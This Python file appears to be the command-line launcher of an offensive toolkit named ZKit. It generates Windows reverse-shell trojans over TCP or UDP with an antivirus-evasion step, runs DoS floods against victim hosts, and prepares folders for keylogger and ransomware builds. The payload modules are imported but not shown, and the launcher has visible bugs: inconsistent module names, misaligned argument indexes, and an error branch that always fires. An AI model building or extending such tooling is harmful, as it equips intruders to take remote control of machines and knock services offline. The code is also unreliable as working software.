from sys import platform
__all__ = ["Why_Do_You_Want_To_Import_This"]


def Why_Do_You_Want_To_Import_This(*arg):
    return "Why_Do_You_Want_To_Import_This"


__author__ = 'Zer0'
# Created A New Header
__github__ = 'https://github.com/000Zer000/ZKit'
#
__version__ = 'WPR_0.9.0'
__license__ = 'Apache License 2.0 Full Text Available In https://github.com/000Zer000/ZKit/blob/master/LICENSE'
__status__ = 'Developing'

if __name__ == "__main__" and platform.startswith('win'):
    try:
        from os import path, system
        from sys import exit as Exit
        from time import sleep as Sleep
        from datetime import datetime
        import socket
        import string
        import random
        from colorama import init, Fore, Back
        from ZKit_Banners import Banners
    except ImportError as Value:
        import sys
        print("One Or Some On Requirments Not Found . Please Install Them And Try Again . Python Threw  : " + str(Value))
        exit(code=1)

    # Initallizing Needed Variables
    PATH = path.dirname(__file__)
    T_PATH = PATH + "/Builded/Trojan/"
    D_PATH = PATH + "/Builded/Dos/"
    K_PATH = PATH + "/Builded/KeyLogger/"
    R_PATH = PATH + "/Builded/Ransomware/"
    init(convert=True)
    print(Fore.LIGHTGREEN_EX + Banners.Banner1 + Fore.RESET)

    Sleep(1)
    while True:

        choice = str(input("ZKit > "))
        choice = choice.lower()
        Choice = choice.split()
        if choice == 'help':
            print(''' * All Captalize Types Are Accepted * Help or HELP or help or HeLp
Trojan -m UDP_OR_TCP -f FILENAME -h HOST_OR_IP -p PORT 
DOS -m SS -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORT -m MESSAGE -c COUNT 
DOS -m SM -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORTS -m MESSAGE -c COUNT 
        ''')
        try:
            if Choice[0] == "trojan" and Choice[5] == "-h" and Choice[7] == "-p":
                from ZKit_Core import Main_Process
                file_name = T_PATH + Choice[4] + ".pyw"
                file_name = Main_Process.Create_File(PATH=file_name)
                strs = Main_Process.Anti_Anti_Virus(Count=4)
                str1, str2, str3, str4 = list(strs)
                if Choice[2] == 'tcp':
                    import ZKit_Core.Trojan.Reverse_Shell_TCP
                    ZKit_Core.Trojans.Reverse_Shell_TCP.Create(
                        Host=Choice[6], Port=Choice[8], str1=str1, str2=str2, str3=str3, str4=str4, PATH=file_name
                    )
                elif Choice[2] == 'udp':
                    import ZKit_Core.Trojans.Reverse_Shell_UDP
                    ZKit_Core.Trojan.Reverse_Shell_UDP.Create(
                        Host=Choice[6], Port=Choice[8], str1=str1, str2=str2, str3=str3, str4=str4, PATH=file_name
                    )
                else:
                    print('[' + Fore.LIGHTRED_EX + '-' + Fore.RESET +
                          '] Bad Argument Or Wrong Mode After -m  : {} '.format(Choice[2]))
            elif Choice[0] == 'dos' and Choice[1] == 'ss' and Choice[3] == 's' and Choice[5] == '-v':
                Source_IP, Source_Port = Choice[4], Choice[6]
                Victim_IP, Victim_Port = Choice[6], Choice[7]
                Count, Message = Choice[9], Choice[8]
                import ZKit_Core.Dos_Attackers.SS
                ZKit_Core.Dos_Attackers.SS.Run(
                    Source_IP, Victim_IP, Source_Port, Victim_Port, Count, Message)
        except IndexError:
            print("Invalid Inputs Type Help To See Full Available Commands.")
        else:
            print("{} Is Not A Valid Input\n".format(choice))
elif not platform.startswith('win'):
    print("Sorry ran on wrong os . this version is comptable with Windows but your Operating System is {}".format(platform))
